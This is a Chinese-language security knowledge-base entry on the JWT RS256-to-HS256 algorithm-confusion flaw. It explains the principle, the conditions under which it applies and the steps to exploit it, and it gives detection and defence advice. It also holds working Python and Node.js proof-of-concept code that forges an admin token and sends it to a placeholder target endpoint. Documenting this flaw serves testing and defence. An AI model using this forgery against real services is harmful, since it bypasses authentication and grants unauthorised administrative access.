---
id: web-generic-jwt-rs256-hs256-confusion
title: RS256→HS256 算法混淆：用公钥当 HMAC 密钥伪造 JWT
type: scenario
domain: web
path: web/generic/jwt
technique: jwt-algorithm-confusion
tags:
- jwt
- rs256
- hs256
- algorithm-confusion
- public-key
- authentication-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
affected_versions: Node.js jsonwebtoken < 9.0.0；Java JJWT < 0.12.0；PHP firebase/php-jwt < 6.0（原文标注，实际取决于算法白名单配置）
verification:
  verified_by: verifier-V8
  verified_at: '2026-11-05T00:37:23+08:00'
  notes: 已对照原文与图 07-09 核对：服务端 jwt.decode(RSA_PUBLIC, algorithms=['RS256','HS256'])、公钥从 jwks 获取、PyJWT 2.x 的 PEM/HMAC 防护与 monkey-patch 说明、旧库版本列表（jsonwebtoken<9.0.0、JJWT<0.12.0、firebase/php-jwt<6.0）均与原文一致；affected_versions 按原文列出并注明取决于算法白名单；PoC 未在本机执行。
url: /docs/web/generic/jwt/web-generic-jwt-rs256-hs256-confusion/
draft: false
kb_aliases:
- 算法混淆
- RS256 转 HS256
- 公钥当 HMAC 密钥
- JWT 公钥签名伪造
- algorithm confusion
---

## 一句话结论

服务端用 RSA 公钥作为 `jwt.decode()` 的验证密钥、同时允许 HS256 时，攻击者把 `alg` 改为 HS256，并用公开的 RSA 公钥作为 HMAC 密钥签名，服务端会用同一公钥做 HMAC 验证并通过，从而伪造任意身份。

## 原理

- RS256 是非对称签名：服务端私钥签名、公钥验证。HS256 是对称 HMAC：签名与验证使用同一个密钥。
- 漏洞代码把公钥传给 `jwt.decode(token, RSA_PUBLIC, algorithms=["RS256","HS256"])`，并信任 Header 中未验证的 `alg`。当 `alg=HS256` 时，库把“验证密钥”（其实是公钥 PEM 文本）当作 HMAC secret。
- 公钥通常可从 `/.well-known/jwks.json`、前端 JS、GitHub 仓库、API 响应中获取。攻击者用该公钥字符串作为 HMAC 密钥，对篡改后的 Payload 计算 HS256 签名。
- 服务端收到后按 `alg=HS256` 用同一公钥做 HMAC，签名自然匹配。核心错误是“允许算法列表混合了对称与非对称算法”，让攻击者可以选择更弱的验证方式。
- PyJWT 2.x 会拒绝 PEM 格式密钥用于 HMAC；但 Node.js `jsonwebtoken` 旧版、Java JJWT 旧版、PHP firebase/php-jwt 旧版及自研逻辑可能没有此防护。

## 触发条件

- 服务端使用 RSA（RS256）签发 JWT，并用公钥验证。
- `algorithms` 白名单同时包含 RS256 与 HS256（或未限制算法）。
- 公钥可获取（JWKS、静态文件、代码仓库等）。
- 服务端没有校验 Header `alg` 与签发算法一致。

## 利用步骤

1. 获取一个 RS256 JWT，确认 Header `alg=RS256`。
2. 从 `/.well-known/jwks.json` 或泄露渠道取得公钥（PEM 或 JWK 转 PEM）。
3. 把 Header `alg` 改为 `HS256`，Payload 改为目标身份。
4. 用公钥文本作为 HMAC 密钥签名，发送到受保护接口。
5. 若库拒绝 PEM 作为 HMAC 密钥，改用无此检查的库/语言实现，或按目标库的密钥解析方式构造。

## PoC

```python
import jwt, requests
from jwt.algorithms import HMACAlgorithm
from jwt.utils import force_bytes

# 仅用于模拟无 PEM 检查的旧库；真实目标若直接接受 PEM 可去掉
HMACAlgorithm.prepare_key = lambda self, key: force_bytes(key)

public_key = open("keys/public.pem").read()
payload = {"sub": "admin", "role": "admin"}
forged = jwt.encode(payload, key=public_key, algorithm="HS256")

r = requests.get("http://target/api/admin",
                 headers={"Authorization": f"Bearer {forged}"})
print(r.status_code, r.text)
```

Node.js 旧版等价思路：

```javascript
const jwt = require('jsonwebtoken');
const pub = fs.readFileSync('public.pem');
const token = jwt.sign({sub:'admin', role:'admin'}, pub, {algorithm:'HS256'});
```

## 变体与关联

- 变体：ES256→HS256 同理；用 JWK 中的 `n`/`e` 重建 PEM 后作为 HMAC 密钥；若服务端校验 `alg` 但允许 `HS256` 与 `RS256` 混用，仍可利用。
- 关联：[[web-generic-jwt-alg-none-bypass]]（算法字段被信任）；[[web-generic-jwt-jku-header-hijack]]（替换验证公钥的另一路径）；[[web-generic-jwt-weak-hmac-key-bruteforce]]（HS256 密钥弱）。
- 边界：PyJWT 2.x 及已修复库会拒绝 PEM 用于 HMAC；服务端固定单一算法白名单时无效。

## 检测与防御

- 检测：RS256 应用中收到 `alg=HS256` 的 token；同一 `kid` 下算法突变；HMAC 验证成功但签发端只应使用 RSA。
- 防御：`algorithms` 只写目标算法一种（RS256 就只允许 RS256）；校验 Header `alg` 与配置一致；升级 JWT 库；不要信任 Header 中的算法选择。
